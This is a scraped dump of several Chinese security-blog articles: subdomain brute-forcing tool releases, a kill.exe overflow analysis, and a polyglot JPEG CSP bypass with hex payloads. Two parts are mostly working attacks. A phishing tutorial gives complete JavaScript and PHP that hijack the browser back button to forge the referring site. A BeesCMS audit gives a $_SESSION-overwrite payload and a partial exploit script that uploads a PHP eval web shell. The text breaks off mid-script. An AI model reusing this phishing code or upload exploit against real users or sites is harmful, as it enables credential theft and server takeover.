了直接可以写大于5层的数，比如10层，如果在遍历到第五层没有新的域名出现，则会自动停止。爆破二级域名使用的是字典或者规则，爆破三级及以下使用的是字典2或者规则2。开始功能即为使用字典或者规则进行二级域名的爆破，然后使用字典2或者规则2一直遍历到没有发现新的域名或者指定的层次为止。遍历功能首先要导入或者添加要遍历的域名(支持带{fuzz}的域名)，使用字典2或者规则2一直遍历到没有发现新的域名或者指定的层次为止。以下为通过三天的循环爆破，以及其他的一些信息收集方式，收集到的腾讯所有域名总数下载地址工具下载   密码：is5fGitHub 源码下载MS509团队博客","2017-02-24 13:17:16","安全工具","FuzzDomain域名爆破工具发布以及开源","http://nsoad.com/Security-tools/20170224/tools-1078.html"
"5ccbfa624f2f0a0a7a69c05b","一直相信不要重复造轮子这句话，但是如果可以造出来更好的轮子，我认为那就应该勇敢的去造。总结一下工具特点：人无我有，人有我优。","yanxiu0614","直相信不要重复造轮子这句话，但是如果可以造出来更好的轮子，我认为那就应该勇敢的去造。总结一下工具特点：人无我有，人有我优。废话不多说，先说特性。特性：1.快，快的有点狠。爆破分为三种模式：low，medium和high。medium的速度在每秒500上下，high的速度在每秒800上下。本来想加一个变态模式，每秒1000+，看后期有需求会加上。（ps：单进程+单线程）2.检测cdn，并且cdn列表不断更新，更有针对性。3.C段，爆破完成后自动对非cdn的ip段进行排序，助力快速挖洞。4.全，测试了某卖饭域名，结果不到3万，中速模式下一个半小时跑完的。5.多级，目前到四级，其实就算下会发现，1000的字典的递归三次之后，量在1个亿。目前没有深入过多，之后会增加。缺点：1.内存消耗有点大，高速模式下在1个G。2.吃带宽很厉害，我在跑中速模式下，QQ都登录不上去（100M带宽）3.基于Python3使用方法：  -h, –help            show this help message and exit  -s , –speed  三种速度模式，low,medium和high，默认是medium。      -d , –domain  要爆破的域名例如：test.com  -l , –level  爆破的域名级数，如test.test.com是1，test.test.test.com是二级运行截图（仅用于功能演示，切勿进行非授权测试）：high模式：medium模式：历程：我必须诉下苦，在最后一个大四寒假，我研究了一周的Python高并发问题，进程,线程,协程和异步。在内存,性能上又优化了两天。少玩多少游戏，请各位随手分享点赞，不胜感激。鸣谢：特别感谢lijiejie和猪猪侠两位前辈的开源，学到了很多东西，并感谢其提供的字典。而这也是我为什么开源的原因。这个会一直维护下去，直到没有必要。此外感谢拉勾网唐总，给予了很多帮助和指导。写在最后：这肯定不是我的第一款开源工具，之后会继续开发其他的，比如cdn检测，服务识别等等。此外打个广告，我博客地址：https://www.yanxiuer.com。更多有关技术的细节会在上边更新。工具地址：https://github.com/yanxiu0614/subdomain3","2017-02-24 13:20:43","安全工具","新一代子域名爆破工具brutedns","http://nsoad.com/Security-tools/20170224/tools-1079.html"
"5ccbfa624f2f0a0a7a69c05c","以为不点开“新建标签页”的图片链接就安全了？别急！现在是时候和我一起追捕漏网之鱼了。上一篇文章，我和大家分享了图片钓鱼的一个小想法《点击一张图片背后的","Kong","以为不点开“新建标签页”的图片链接就安全了？别急！现在是时候和我一起追捕漏网之鱼了。上一篇文章，我和大家分享了图片钓鱼的一个小想法《点击一张图片背后的风险》 ，这一篇文章，让我们来看看另一种情况下的钓鱼策略——源窗口打开图片钓鱼。寻找思路试想一下这个情景你正在浏览某个你所信任的网站，但评论里的某张图片看不清楚。接下来你打开该图片，然而会有2种情况新窗口打开： 上一篇文章所讨论的内容，源网站被改变成钓鱼网站。源窗口打开： 这一篇文章要讨论的内容。你打开该图片，看完后点击浏览器上的返回按钮，继续返回浏览评论。等等！这不就是我们可以利用的地方吗？完全可以让他点击浏览器“返回”按钮返回的那个地址不再是原来的网站地址。而是我们的钓鱼网址。有了这个思路,那接下来，就要付出实践了。要知道，想修改浏览器的历史记录那是非常困难的（利用漏洞另说），所以只能利用已知且完全正常的方法来实现。原理实现HTML5给前端带来了很多丰富的特性，最重要的是现在浏览器基本都已经支持HTML5。那如果想修改历史记录肯定要去找找有关的函数通过寻找，发现html5推出的2个新特性replaceState、pushState可以用来实现我们所需要的功能。至于这2个方法我这里就不在多说了，直接给图，大家自己看吧。从手册上看，还是pushstate()比较适合我们，因为该方法每修改一次网址就会在历史记录里添加一个新的记录，那点击浏览器上的“返回上一页”，就能回到上一个地址了(未执行该命令时候的地址)！题外话，以前该方法未推出的时候，运用ajax技术的网站都面临着一个问题，网页内容无法被搜索引擎所抓取。现在有了这个特性，网站可以直接修改浏览器上的地址，但不跳转，然后用ajax技术获取网页。搜索引擎如果要抓取的话也有地址可抓，抓取时会请求该地址，然后网站再根据请求的地址返回对应的信息，可谓一举两得。想看看例子？yotube、twitter等网站就是这样做的。实践操作用户点击一张图片，然后源网站跳到外站图片显示。可以用上一篇文章的方法来判断是否为浏览器访问。<!--?phpif(substr($_SERVER['HTTP_ACCEPT'],0,5) == ""image""){    header('Location: http://77g17a.com1.z0.glb.clouddn.com/freebuf-test-l.png');}else{    echo """";    echo """";    echo ""blabalabala........"";    echo """";}?&gt;当用户打开该图片时，第一步先用history.pushState()新建1条历史记录，然后监听这个事件，一旦发现返回按钮被触发，则开始伪造源网页。Talk is cheap. Show me the code。var ispop;ispop=falsewindow.onpopstate = function (event) {     if(ispop == false){          ispop =true;          document.body.style.background ='black';          console.log(""hello"");      }}if(ispop == false){     document.title = ""This is the new page title."";     history.pushState(null,null,""hello"");}简单的讲解一下这些代码的意思，window.onpopstate里面传入的是一个匿名函数，仅当你触发了onpopstate事件的时候才会执行（就是当你点击“返回”按钮后才会触发）。该事件内的代码主要是把网页的背景颜色改为黑色，并在控制台输出hello。接下来的代码是直接执行的，就是把标题改掉，把地址改掉。直接给个演示吧！从图中可以很清晰的知道该代码所做的事。好了，现在要继续完善我们的代码。让钓鱼网站变的更加真实，肯定是要先模仿它的标题和icon。解决icon的问题要动态修改网站的icon，那必须要用js无疑，经过一翻寻找。终于让我找到了修改icon的方法。再次祭出代码var link = document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = ""https://www.google.com/images/branding/product/ico/googleg_lodp.ico"";document.getElementsByTagName('head')[0].appendChild(link);废话少说，看看实际运行起来的样子。但是，必须要与跳转过来的网站图标相同，比如我在FreeBuf上留了一张图片，用户点击图片查看，看完以后点击返回,但实际上并没有返回到freebuf，而是触发了window.onpopstate里的代码，伪造出了一个和freebuf很像的网站而已。所以既然是由freebuf上跳转过来的，那我们一定能通过document.referrer拿到跳转地址。好了，接下来的问题是，如何拿到网站的icon，再次用Google一顿找，发现Google其实有一个api， https://www.google.com/s2/favicons?domain=freebuf.com 直接用该地址跟上你要获取图标的网址就能得到你所想要的图标，然而……ok，那让我们继续去百度翻翻，发现国内有几个个人平台有提供这样的api。接下来，需要传入的地址必须是网站的域名，而通过document.referrer拿到的地址大多是 http://XX.XX/XX/XX.html 这样的地址。没事，用js还怕搞不定这些？下面放出修改后的代码var link = document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';var urlLink = document.referrer.replace(""http://"", '').replace(""https://"", '').split('/')[0];link.href = ""http://ico.ihuan.me/""+urlLink+""/cdn.ico"";document.getElementsByTagName('head')[0].appendChild(link);解决title的问题目前没找到有相关网站提供这个api，那就自己来吧，自己用php实现一个，输入网址，读取网页，再匹配一下。<!--?phpheader(""Content-type: text/html; charset=utf-8"");$url = $_GET['url'];echo getTitle($url);function getTitle($sFile){    $sData = file_get_contents($sFile);    if(preg_match('/]*&gt;.*&lt;\/head&gt;/is', $sData, $aHead))    {           $sDataHtml = preg_replace('/&lt;(.[^&gt;]*)&gt;/i', strtolower('&lt;$1&gt;'), $aHead[0]);        $xTitle = simplexml_import_dom(DomDocument::LoadHtml(mb_convert_encoding($sDataHtml,'HTML-ENTITIES', 'UTF-8')));        return $xTitle-&gt;head-&gt;title;    }    return null;}?&gt;保存到XX.php，需要的时候用js读取XX.php?url=XXX的内容就可以了，这里就不演示的。代码整合现在，一个小小的钓鱼脚本已经完成了，现在我们要把上面的这些代码整合在一起，把它打造成一个钓鱼工具。把最终的js代码贴出来var ispop,urlLink ;ispop=falsewindow.onpopstate = function (event) {  if(ispop == false){    ispop =true;    document.body.innerHTML ="" "";    console.log(""hello"");  }}if(ispop == false){  var link = document.createElement('link');  link.type = 'image/x-icon';  link.rel = 'shortcut icon';  urlLink = document.referrer.replace(""http://"", '').replace(""https://"", '').split('/')[0];  link.href = ""http://ico.ihuan.me/""+urlLink+""/cdn.ico"";  document.getElementsByTagName('head')[0].appendChild(link);  ChangeTitle(urlLink);  history.pushState(null,null,""hello.php"");}function ChangeTitle(){  var xmlhttp;  if (window.XMLHttpRequest)  {    xmlhttp=new XMLHttpRequest();  }  else  {    xmlhttp=new ActiveXObject(""Microsoft.XMLHTTP"");  }  xmlhttp.onreadystatechange=function()  {    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)    {      document.title = xmlhttp.responseText;    }  }  uurl = ""/t.jpg/get.php?url=""+document.referrer;  xmlhttp.open(""GET"",uurl,true);  xmlhttp.send();}如果想提高成功率可以把history.pushState(null,null,""hello"")复制了10个，因为这样会让钓鱼网址的历史记录增加很多条，就可以防止因为用户点击多次返回按钮，而跳到源网页的尴尬。接下来把它整合进php就大功告成了！<!--?phpif(substr($_SERVER['HTTP_ACCEPT'],0,5) == ""image""){    header('Location: http://77g17a.com1.z0.glb.clouddn.com/freebuf-test-l.png');}else{    echo """";    echo """";}?&gt;实际测试第一步：找一个能插入图片的页面（图片必须要以超链接的形似，且可以打开）第二步：等鱼上钩。这里我就拿自己的网站来测试了（其实应该在不同域名的网站测试，我这里是同域名，看起来会不直观），我从网络上下载了个博客的模版，并嵌入一张图片。仔细看下面的浏览器地址本来该页面应该是在test/single.html里显示的，结果第二次就变成了/t.jpg/hello.php里的页面（即钓鱼网页）。最后，原网页其实是显示在/t.jpg/hello.php的框架里，用户最后并没有回到他最早访问test/single.html页面。但用户却并不知道。如果这时候弹出一个提示框提示用户登陆的话！那将……小结也许有人会觉得，这些钓鱼方法非常low甚至非常拙劣，但我觉得并不能认为它们拙劣就不去重视它。一般能在该网站看到我文章的人，就算不是安全大牛，也至少对互联网有较深的认识。对于你们来说，这点小技俩当然算不上什么，不过国内毕竟有这么多网民，大部分对互联网也并不了解。甚至一些高中生对计算机也只停留在打游戏的认识上，对网络安全认识严重不足。而这些人才是那些骗子人渣们的目标。无论你是网络安全研究员还是网站站长还是程序员，我们都有一个最终目的，就是让我们的产品面向普通用户。对于我们来说，我们无法让所有用户都提高警惕，但我们却能运用我们的知识，让用户尽量远离危害！这也是我写这2篇文章的初衷。谢谢大家对我这2篇文章的支持！微博：http://weibo.com/beng1","2016-10-24 14:48:48","Web安全","图片钓鱼：追捕漏网之鱼","http://nsoad.com/Article/web/20161024/629.html"
"5ccbfa624f2f0a0a7a69c05d","前几日，笔者在exploit-db上发现了一个kill.exe的溢出漏洞，在众多的UAF漏洞中，这种单纯的溢出漏洞简直如一股清泉一般，遂将其捡了出来，深入地看了看。","silence","1. 前言前几日，笔者在exploit-db上发现了一个kill.exe的溢出漏洞，在众多的UAF漏洞中，这种单纯的溢出漏洞简直如一股清泉一般，遂将其捡了出来，深入地看了看。原计划写一个完整的可用EXP，但貌似失败了。所以，这里以半介绍半讨论的形式聊一聊这个EXP的问题。对于在这方面比较有经验有见解的读者，笔者诚恳的请求不吝赐教；而对于这方面不太了解的读者，希望这篇可以把一些基本信息介绍给大家。2. 漏洞分析Kill.exe是微软发行的Windows调试工具包的一个小工具，用于终止一个或多个进程，以及它们的所有线程。在exploit-db中提到的包含漏洞的kill.exe的版本号为：6.3.9600.17298。在安装Windows Driver Kit (WDK)8.1时，会自动安装该版本的kill.exe工具。此外，在6.1.7650.0版本的kill.exe工具中，同样存在类似的问题。该版本的kill.exe工具可以通过安装WDK 7.1获取。下面首先分析一下6.3.9600.17298版本的kill.exe的漏洞函数。Kill.exe在处理命令行参数时触发了栈溢出漏洞，可以向栈内写数据：该漏洞函数的内部逻辑也较为简单，当只接受到一个参数时，可以概述为：当有多个参数时，用一个循环把上述内容进去，即针对每个参数判断是否为数字然后进行相应操作并保存结果。需要注意的是，原函数的内容要比这种表述复杂的多，该图只是示意图，用于帮助读者理解该函数的所做工作。下面仔细说明漏洞函数的两个分支：左侧分支代表接收到了一串数字字符串为参数，则计算该字符串所代表的数值。其中，v1为字符串起始地址，v7为最终的计算结果。48为’0’的ascII码值，*10表示乘以权重。右侧分支表示接收到了一串字符串，则将字符串内容复制到栈上。其中，v1为字符串起始地址，v5为指向某栈空间的指针。如果仔细研究的话，可以发现在左侧分支中同样存在一个漏洞：v7存在整数溢出漏洞，汇编代码如下：上部分用于判断字符串的下一位是否为数字，下部分用于计算其数值。显然，EAX存在整数溢出的问题。但是，这漏洞并没有什么用。恭喜你，获得“认真的代码阅读者”成就。下面着重看右侧分支也存在一个漏洞，即栈溢出漏洞。其执行复制操作的汇编指令如下：图中的3次判断的含义为：该字符是否为空格，是否为制表符，是否为空，如果是则终止复制；否则继续复制下一个字符。当笔者以长串的’A’作为其参数启动kill.exe之后，可以观察到栈被覆盖的情况：3. EXP讨论与Win XP相比，Win 7环境更加复杂多变，所以本节将EXP相关的讨论放在Win XP环境下。首先，将kill.exe程序复制到Win XP的虚拟机中，然后考虑漏洞的利用方法。粗略的归纳一下，常见的栈溢出漏洞的利用方式有3种：1. 覆盖函数返回地址。2. 覆盖SEH结构。3. 覆盖其他有用数据或关键数据，如对象以及虚表指针等。下面开始分开讨论kill.exe的情况，并试图找出可行的可用方式。3.1 覆盖返回地址在WinXP环境下，覆盖返回地址当然是一种简单可靠地利用，但是这里存在一个问题：kill.exe是有stack cookie保护的，即有/GS标记：自然而然地想到，有没有办法过掉这个stack cookie。首先，可以肯定的是，这个cookie并非是静态的值。进一步的，有些文献表示可以计算或猜测这个cookie的大致取值范围，以减少/GS的保护能力，但在这里不打算选用这类方法。最后，由于kill.exe中的栈溢出漏洞只能覆盖部分栈中的内容，无法覆盖到位于.data段中的数据，所以修改cookie值也是不可行的。无奈之下，只能选用覆盖SEH结构的利用方法，当然这也是一种有效绕过/GS保护的EXP方法。3.2 覆盖SEH结构覆盖SEH结构同样是一种颇为有效的利用手法。但是这里同样存在着一个问题：kill.exe是有Safeseh保护的，即有/Safeseh标记：此外，图中还可以发现kill.exe开启了CFG保护，即有/guard:cf标记。但是由于笔者的分析环境是winXP系统，所以暂时不考虑CFG保护。因为存在Safeseh保护，所以EXP变得更加麻烦。绕过Safeseh保护最好的方法，就是不使用覆盖SEH结构的EXP技巧，而是直接去覆盖函数返回地址或其他关键栈数据，而这显然是不可行的。考察被kill.exe加载的其他模块，发现全部都有/Safeseh标记，这就使得通过未启用/Safeseh的模块绕过Safeseh变得不可行。不过，需要明确一点，kill.exe在win7环境下是自动开启DEP和ASLR的，截图如下：而在winXP环境下，并没有开启DEP：至于为何在winXP环境下，并没有开启DEP的原因，笔者并没有考证。暂不考虑未开启DEP的原因，既然kill.exe没有开启DEP的话，那么只要保证异常处理函数不在任意模块之中，且不在栈中，那么就可有效的绕过Safeseh。下面，笔者尝试用该方法过掉Safeseh保护。首先，观察进程空间内不属于任何模块的地址空间：以上地址都是不可取的，原因如下：如果打算让kill.exe触发异常处理函数，必须赋值很长的数据导致向栈之后的不可写地址写入数据，那么所有的写入内容不能包含空格、换行符以及空字符。而以上所有这些地址的最高位字节均为0×00，这个字节将终止栈的覆盖过程，原因见第1节中的分析。此外，还有另外一小部分不属于任何模块的地址空间：在这一部分地址空间中，可以用metasploit中的工具查找pop pop retn指令串，其结果如下：当笔者尝试使用这些地址的时候，发现这些地址无法与ASCII码或者GBK码对应。这里捎带一提，kill.exe是可以接受GBK编码的字符（简体字、繁体字等），虽然这可以扩大可用的字符数量，但并没有什么帮助。3.3 覆盖其他关键数据可以观察从覆盖起始点，到stack cookie之间的所有栈空间，并未发现任何有价值的关键数据，即便将其完全覆盖成错误数据，程序也是可以正常运行，并在退出漏洞函数时清理了包含错误数据的栈空间。到此为止，笔者并没有找到有效的EXP方法，暂时决定先搁置此版本的kill.exe，下面开始考察其他版本的kill.exe工具。4. 另一个版本的kill.exe分析在第1节中，笔者提到了另一个版本的kill.exe工具，该版本的kill.exe工具同样有GS和Safeseh标记，无DEP，但也没有guard:cf标记。此版本的kill.exe工具在栈溢出时的关键代码与第2节分析的内容略有不同，如下图所示：上图中，关键的变量名已经标出，分别是source、temp和destination，这三个变量的含义正如其名称所示。此版本的kill.exe在溢出时，会覆盖destination变量，从而使得可以对覆盖的内存地址和内容进行很小限度的控制。但这是否可以导致有效的EXP，就留给有兴趣的读者自己分析吧。5. 结论按照本文的分析结果来看，Microsoft的各种安全机制已经非常成熟，非常可靠，在这诸多的安全防护机制之下，MS的产品即便存在一些漏洞，也无法实现其有效利用，尤其针对传统的简单单一漏洞。当然，在更复杂的情况和环境之中，通过多个漏洞组合或者其他逻辑上的错误漏洞，也确实存在一些可被利用的漏洞。而对于非MS产品，那就另当别论了。此外由于笔者知识有限、才疏学浅，笔者个人无法实现有效的EXP并不代表其他分析人员同样无法实现，在这里笔者由衷地期待能够得到这些高人的指点。对于不太熟悉本文内容的读者，希望这篇能带来一些启发和帮助。","2016-10-07 15:15:10","系统安全","kill.exe溢出漏洞分析与EXP讨论","http://nsoad.com/Article/system/20161007/495.html"
"5ccbfa624f2f0a0a7a69c05e","James 曾请我看看是否能创建一个多语言的 JavaScript/JPEG （注：此处即将 JPEG 当做 JS 执行）。这么做的话，我将可以通过在同一域名用户可上传的图片，来绕过 CSP 的保护。","kong","James 曾请我看看是否能创建一个多语言的 JavaScript/JPEG （注：此处即将 JPEG 当做 JS 执行）。这么做的话，我将可以通过在同一域名用户可上传的图片，来绕过 CSP 的保护。我欣然接受挑战，然后开始剖析图片格式。前四个字节是非 ASCII 的 JavaScript 变量 0xFF 0xD8 0xFF 0xE0 。然后，接下来的两个字节指定了 JPEG 头部的长度。如果我们使用字节 0x2F 2A设置文件头的长度为 0x2F2A，你会猜到，我们有一个非 ASCII 字符的变量，后面更早多行 JavaScript 注释。然后，我们必须将 JPEG 头填充为 0x2F2A 长度的 null。它看起来是这样的：FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 48 00 00 00 00 00 00 00 00 00 00...  在 JPEG 注释中，我们可以闭合 JavaScript 注释，并在 payload 后面为我们的非 ASCII 字符的 JavaScript 变量赋初值，随后在 JPEG 注释的末尾创建另一个多行注释。FF FE 00 1C 2A 2F 3D 61 6C 65 72 74 28 22 42 75 72 70 20 72 6F 63 6B 73 2E 22 29 3B 2F 2A  0xFF 0xFE 是注释头的长度，0x00 0x1C 指定了注释的长度，其余的便是我们的 JavaScript payload，当然此处为 */=alert(""Burp rocks."")/*接下来需要闭合 JavaScript 注释，我在图像结束标记之前编辑了图片数据的最后四个字节。文件的结尾看起来是这样子的：2A 2F 2F 2F FF D9  0xFF 0xD9是图片结束的标志。很好，我们的多语义 JPEG 就有了，不过这还不够。如果你不指定字符编码，这很有效，但是 FireFox 使用 UTF-8 作为文档编码，包含脚本代码的时候，它破坏了其多语义性。在 MDN 里，它没有说明脚本支持 charset 属性，但实际上是支持的。所有要让脚本正常运行，你需要在 script 标签里指定 ISO-8859-1 编码，这就能运行良好了。值得注意的是，多语义的 JPEG 可以在 Safari，Firefox，Edge 和 IE 11 上使用。Chrome 机智地没有将图像作为 JavaScript 执行。多语义 JPEG PoC 在此：Polyglot JPEG将图像作为 JavaScript 执行的代码如下：&lt;script charset=""ISO-8859-1"" src=""http://portswigger-labs.net/polyglot/jpeg/xss.jpg""&gt;&lt;/script&gt;  文件大小的限制我试着将这张图片作为 phpBB 个人资料照片上传，但是文件大小限制为 6k，最大的尺寸为 90x90。我通过裁剪缩小了 logo 的大小，并考虑减少 JPEG 数据的方法。在 JPEG 文件头中，我使用 /* （对应十六进制 0x2F 和 0x2A，合成 0x2F2A）造成了 12074 的长度，这需要大量填充，将导致图形太大无法作为配置文件的长度。查阅 ASCII 表，我试着找出一个字符组合，这将会是有效的 JavaScript 并减少 JPEG 头中的填充量，同时还会被识别为有效的 JPEG 文件。我可以找到的最小的起始字节便是 0x9（制表符），后面跟着 0x3A（冒号），这最后组合成十六进制 0x093A （2362），为我们的文件节省了不少字节，并创建了一个有效的非 ASCII JavaScript 标签语句，后面便是 JFIF 标识符的变量。然后，我将斜杠 0x2F 而不是 NULL 放在 JFIF 标识符的结尾，将星号放在对应版本号的位置。十六进制是这样的：FF D8 FF E0 09 3A 4A 46 49 46 2F 2A  现在我们继续用 NULL 注入其余的 JPEG 头，并注入 JavaScript payload：FF D8 FF E0 09 3A 4A 46 49 46 2F 2A 01 01 00 48 00 48 00 00 00 00 00 00 00 ... (padding more nulls) 2A 2F 3D 61 6C 65 72 74 28 22 42 75 72 70 20 72 6F 63 6B 73 2E 22 29 3B 2F 2A  这是更小的图片：Polyglot JPEG smaller影响如果你允许用户上传 JPEG 图片，且这些上传的图片与你的应用程序在同一域下，你的 CSP 还允许来自 ""self"" 的脚本，你便可以通过注入脚本将其指向图像的方法绕过 CSP 。结论总而言之，如果你在你的站点上允许上传 JPEG 图片或者任何形式的文件，这值得将它们放在一个不同的域下。当验证一个 JPEG 时，你应该重写 JPEG 头，以确保其中没有偷偷放置的代码，并且删除 JPEG 注释。显然，你的 CSP 也不必将脚本的图片资源列入白名单。如果没有Ange Albertini的出色工作，这篇文章就不会出现。我使用它的 JPEG 格式图片创建了通用的多语义 JPEG 图片。Jasvir Nagra 也在 多语义 GIF 上启发了我。","2016-12-05 16:51:35","Web安全","Bypassing CSP using polyglot JPEGs","http://nsoad.com/Article/web/20161205/884.html"
"5ccbfa624f2f0a0a7a69c05f","前言上一回(http://bbs.ichunqiu.com/thread-13714-1-1.html )说到快速漏洞挖掘中的几个重点关注对象，命令执行，文件操作，sql注入。并且拿sql做为例子简单做了一次代码审","Kong","前言上一回(http://bbs.ichunqiu.com/thread-13714-1-1.html )说到快速漏洞挖掘中的几个重点关注对象，命令执行，文件操作，sql注入。并且拿sql做为例子简单做了一次代码审计，今天换一个思路，从文件操作部分入手，毕竟 文件操作一个搞不好就是getshell，比起注入按部就班慢慢来可要爽快多了。一、关注重点对于文件操作部分来说，首先对php内置的文件操作函数的作用和特性要有一个大概的了解file_getcontents() file_putcontents() move_uploaded_file() readfile() fopen() file() fputs() fwrite() …………这些都是常用的文件读写类函数，一般文件类的漏洞直接搜索这些函数的调用，跟踪上下文参数传递过程就可以了。说起来挺简单 其实要一个一个调用看过去还是很费时间的，尤其是在快速漏洞挖掘中，对系统结构还不太熟悉，有些参数传递或者方法可能一眼看上去就懵比了。那么如何来快速发现一个文件类的漏洞呢。审计文件类的漏洞，首先我会去看这套系统的上传部分。上传部分是已经构造完成的一套从输入到写入到输出的流程，如果其中存在问题，那么很可能直接就拿到shell。上传漏洞被挖了这么多年，各类cms或多或少都会在上传部分做一些检查和限制，常见的检查有$_FILES['file']['name'] 一般会从上传文件的文件名中取出扩展名，并与白名单或者黑名单做比较来判断是否继续上传。$_FILES['file']['type'] 上传文件的类型，一般是与白名单比较。$FILES['file']['tmpname'] 上传文件的临时保存文件，有些比较严谨的CMS会在这个阶段 用getimagesize等函数对临时文件做检查。如文件不合法 直接丢弃常见的限制有使用isuploadedfile() 这个函数会检查$FILES['file']['tmpname'] 是否为合法的上传文件，当$FILES被漏洞覆盖的时候，可被修改的$FILES['file']['tmp_name']将是一个极大的安全威胁，如果处理文件上传的函数是copy 那么最轻都是一个任意文件读取的漏洞。单独使用moveuploadedfile()函数处理上传文件，理由同上，moveuploadedfile函数也会判断是否为合法文件。减少系统存在变量覆盖漏洞时躺枪的概率。文件名不可控且后缀名限制为某个数组的成员 比如$ext=array('jpg','png','gif');$filename = 'user_avatar_01' . $ext[$s];接下来就看看我们的目标beescms二、实战先来看看beescms的上传部分代码if(isset($_FILES['up'])){  if(is_uploaded_file($_FILES['up']['tmp_name'])){          if($up_type=='pic'){                $is_thumb=empty($_POST['thumb'])?0:$_POST['thumb'];                $thumb_width=empty($_POST['thumb_width'])?$_sys['thump_width']:intval($_POST['thumb_width']);                $thumb_height=empty($_POST['thumb_height'])?$_sys['thump_height']:intval($_POST['thumb_height']);                $logo=0;                $is_up_size = $_sys['upload_size']*1000*1000;                $value_arr=up_img($_FILES['up'],$is_up_size,array('image/gif','image/jpeg','image/png','image/jpg','image/bmp','image/pjpeg'),$is_thumb,$thumb_width,$thumb_height,$logo);                $pic=$value_arr['pic'];                if(!empty($value_arr['thumb'])){                $pic=$value_arr['thumb'];                }                $str=""&lt;script type=\""text/javascript\""&gt;$(self.parent.document).find('#{$get}').val('{$pic}');self.parent.tb_remove();&lt;/script&gt;"";                echo $str;                exit;        }//图片上传}else{die('没有上传文件或文件大小超过服务器限制大小&lt;a href=""javascript:history.back(1);""&gt;返回重新上传&lt;/a&gt;');  }}可以看到 用is_uploaded_file检查了上传文件是否合法，所以即使系统有变量覆盖漏洞（这套系统的确是有的，后面会说），也帮不上多大忙了实际上传用的是up_img函数 接着跟过去看看function up_img($file,$size,$type,$thumb=0,$thumb_width='',$thumb_height='',$logo=1,$pic_alt=''){                  if(file_exists(DATA_PATH.'sys_info.php')){include(DATA_PATH.'sys_info.php');}                if(is_uploaded_file($file['tmp_name'])){                if($file['size']&gt;$size){                        msg('图片超过'.$size.'大小');                }                $pic_name=pathinfo($file['name']);//图片信息                                 $file_type=$file['type'];                if(!in_array(strtolower($file_type),$type)){                        msg('上传图片格式不正确');                }                $path_name=""upload/img/"";                $path=CMS_PATH.$path_name;                if(!file_exists($path)){                        @mkdir($path);                }                $up_file_name=empty($pic_alt)?date('YmdHis').rand(1,10000):$pic_alt;                $up_file_name2=iconv('UTF-8','GBK',$up_file_name);                $file_name=$path.$up_file_name2.'.'.$pic_name['extension'];                                 if(file_exists($file_name)){                        msg('已经存在该图片，请更改图片名称！');//判断是否重名                }                                 $return_name['up_pic_size']=$file['size'];//上传图片大小                $return_name['up_pic_ext']=$pic_name['extension'];//上传文件扩展名                $return_name['up_pic_name']=$up_file_name;//上传图片名                $return_name['up_pic_path']=$path_name;//上传图片路径                $return_name['up_pic_time']=time();//上传时间                unset($pic_name);                //开始上传                if(!move_uploaded_file($file['tmp_name'],$file_name)){                        msg('图片上传失败','',0);                }好了来看看他的检查和限制$file_type=$file['type'];                if(!in_array(strtolower($file_type),$type)){                        msg('上传图片格式不正确');                }这里检查了上传文件的type 如果type不在白名单里 就直接提示出错 这个检查其实做的是无用功，type来自客户端，想怎么伪造都可以 再来看看保存的文件名$pic_name=pathinfo($file['name']);//图片信息…………$up_file_name=empty($pic_alt)?date('YmdHis').rand(1,10000):$pic_alt;                $up_file_name2=iconv('UTF-8','GBK',$up_file_name);                $file_name=$path.$up_file_name2.'.'.$pic_name['extension'];并没有做任何检查就直接取了$file['name']（就是我们上传时候的文件名）的后缀来给新生成的文件，只要伪造合法的type就能妥妥的getshell了三、一波三折结束了么？并没有，其实beecms这套系统前台根本就没有上传点。。。所有的上传功能都需要后台权限。一个后台getshell当然不能满足，于是继续挖掘。先来看看是怎么验证后台权限的 admin/upload.php第二行include('init.php');  admin/init.php 第54行if(!is_login()){header('location:login.php');exit;}  来看看这个is_login函数includes/fun.php 第997行function is_login(){          if($_SESSION['login_in']==1&amp;&amp;$_SESSION['admin']){                if(time()-$_SESSION['login_time']&gt;3600){                        login_out();                }else{                        $_SESSION['login_time']=time();                        @session_regenerate_id();                }                return 1;        }else{                $_SESSION['admin']='';                $_SESSION['admin_purview']='';                $_SESSION['admin_id']='';                $_SESSION['admin_time']='';                $_SESSION['login_in']='';                $_SESSION['login_time']='';                $_SESSION['admin_ip']='';                return 0;        } }这里并没有对用户信息做检查，只是单纯的判断了是否存在login_in admin这两个session标识位和是否超时而已 前面说到过这套系统存在变量覆盖漏洞 如果能覆盖(添加)这几个$_SESSION值 就能绕过这个检查$SESSION覆盖有个必须前提，session_start()必须出现在覆盖之前，不然就算覆盖了$SESSION变量，一旦session_start() 变量就会被初始化掉。 来看看覆盖的地方includes/init.php 部分代码省略session_start();  @include(INC_PATH.'fun.php');define('IS_MB',is_mb());   unset($HTTP_ENV_VARS, $HTTP_POST_VARS, $HTTP_GET_VARS, $HTTP_POST_FILES, $HTTP_COOKIE_VARS);  if (!get_magic_quotes_gpc())  {    if (isset($_REQUEST))    {        $_REQUEST  = addsl($_REQUEST);    }    $_COOKIE   = addsl($_COOKIE);        $_POST = addsl($_POST);        $_GET = addsl($_GET);}if (isset($_REQUEST)){$_REQUEST  = fl_value($_REQUEST);}      $_COOKIE   = fl_value($_COOKIE);        $_GET = fl_value($_GET);@extract($_POST);@extract($_GET);@extract($_COOKIE);一个全局过滤的代码，最后用extract来初始化变量 由于没有使用EXTR_SKIP参数导致任意变量覆盖，又由于执行的时候已经session_start()了 所以可以覆盖（添加）任意$_SESSION值。 这么一来就能绕过后台检查把一个后台getshell变成前台getshell了四、利用利用就很简单了，首先POST index.php_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999  然后打开/admin/upload.php 选择一个php文件上传 修改上传包中的Content-Type:为image/png就可以了 算了还是把exp放上来吧。。。&lt;?php  print_r('  ******************************************************    Beescms File Upload Vulnerability*    by SMLDHZ*    QQ:3298302054*    Usage: php '.basename(__FILE__).' url*    php '.basename(__FILE__).' [url]http://www.beescms.com/beescms/[/url]*****************************************************');  if($argc!=2){          exit;}$uri = $argv[1];$payload1 = '_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999';$payload2 = array('up""; filename=""shell.php""'.""\r\nContent-Type:image/png\r\n\r\n&lt;?php eval(\$_POST['x']);?&gt;""=&gt;''  );preg_match('#Set-Cookie:(.*);#',myCurl($uri.""/index.php"",$payload1),$match);  if(!isset($match[1])){          die('[-]Opps! 